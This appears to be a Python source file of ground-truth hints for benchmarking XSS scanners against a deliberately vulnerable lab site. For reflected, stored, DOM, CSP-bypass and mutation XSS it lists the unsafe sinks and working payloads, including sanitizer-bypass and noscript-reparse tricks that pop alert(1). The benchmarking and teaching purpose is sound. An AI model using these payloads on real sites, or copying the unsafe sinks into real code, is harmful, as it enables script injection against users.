"""Per-lab detection hints for XSS labs.

Exposed via /meta/<slug> on xss.vulnlab.dev. Lets you benchmark a scanner's
output against ground truth — for each lab, what *kind* of XSS finding
should it produce, what payload demonstrates it, and what marker proves
the payload ran.

A scanner doesn't actually need to *execute* the payload to be considered
correct here; static or dynamic findings that line up with (cwe, subtype,
sinks, exploit_examples) are the bar.
"""
from __future__ import annotations

CWE_XSS = "CWE-79"
OWASP_2021 = "A03:2021 — Injection (XSS)"

DETECT_HINTS: dict[str, dict] = {
    "reflected": {
        "cwe": CWE_XSS,
        "owasp": OWASP_2021,
        "subtype": "reflected-html-context",
        "sinks": ["jinja Markup(user_input)", "{{ user_input | safe }}"],
        "exploit_examples": [
            "/reflected/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
            "/reflected/?q=%3Cimg%20src=x%20onerror=alert(1)%3E",
        ],
        "success_markers": ["alert(1)"],
        "tags": ["reflected", "html-context", "no-escape"],
        "scanner_should_fire": True,
    },
    "stored": {
        "cwe": CWE_XSS,
        "owasp": OWASP_2021,
        "subtype": "stored-persistent",
        "sinks": ["jinja Markup(user_input)"],
        "exploit_examples": [
            "POST /stored/ with body=<img src=x onerror=alert(1)>",
        ],
        "success_markers": ["alert(1)"],
        "tags": ["stored", "persistent", "second-order"],
        "scanner_should_fire": True,
    },
    "dom": {
        "cwe": CWE_XSS,
        "owasp": OWASP_2021,
        "subtype": "dom-based",
        "sinks": ["element.innerHTML <- location.hash"],
        "exploit_examples": [
            "/dom/#<img src=x onerror=alert(1)>",
        ],
        "success_markers": ["alert(1)"],
        "tags": ["dom", "client-side-sink", "fragment-only", "invisible-to-server"],
        "scanner_should_fire": True,
        "notes": (
            "Server never sees the fragment. Response-only DAST scanners "
            "miss this; needs a headless browser or static JS analysis."
        ),
    },
    "csp-bypass": {
        "cwe": CWE_XSS,
        "owasp": OWASP_2021,
        "subtype": "csp-bypass-via-same-origin-jsonp",
        "sinks": ["jinja Markup(user_input) + <script src=/jsonp?cb=...>"],
        "exploit_examples": [
            "/csp-bypass/?q=%3Cscript%20src=%22/csp-bypass/jsonp?cb=alert(1)//%22%3E%3C/script%3E",
        ],
        "success_markers": ["alert(1)"],
        "tags": ["csp", "script-src-self", "jsonp-callback", "bypass"],
        "scanner_should_fire": True,
        "notes": (
            "Detecting *just the CSP* as misconfigured is also valid — the "
            "presence of a reflective JSONP endpoint on the same origin "
            "neutralizes script-src 'self'."
        ),
    },
    "mxss": {
        "cwe": CWE_XSS,
        "owasp": OWASP_2021,
        "subtype": "mutation-xss-via-innerhtml-reparse",
        "sinks": ["regex-based HTML sanitizer + element.innerHTML round-trip"],
        "exploit_examples": [
            # Easy: the regex only catches `\s+on*=`. Using `/` as the HTML5
            # attribute separator bypasses it entirely.
            "/mxss/?comment=%3Cimg+src%3Dx%2Fonerror%3Dalert(1)%3E",
            # Harder: even if you tighten the regex, an innerHTML reparse of
            # parser-mode-shifting tags resurrects stripped payloads.
            "/mxss/?comment=%3Cnoscript%3E%3Cp+title%3D%22%3C%2Fnoscript%3E%3Cimg+src%3Dx+onerror%3Dalert(1)%3E%22%3E",
        ],
        "success_markers": ["alert(1)"],
        "tags": ["mxss", "mutation", "noscript", "regex-sanitizer", "innerhtml-reparse", "attribute-separator"],
        "scanner_should_fire": True,
        "notes": (
            "Two layered bugs: (1) the regex `\\s+on[a-z]+=` is bypassed by "
            "`/` as the HTML5 attribute separator. (2) Even with a tighter "
            "sanitizer, the innerHTML round-trip reparses parser-mode tags "
            "(<noscript>/<style>/<svg>) and can re-activate stripped content."
        ),
    },
}
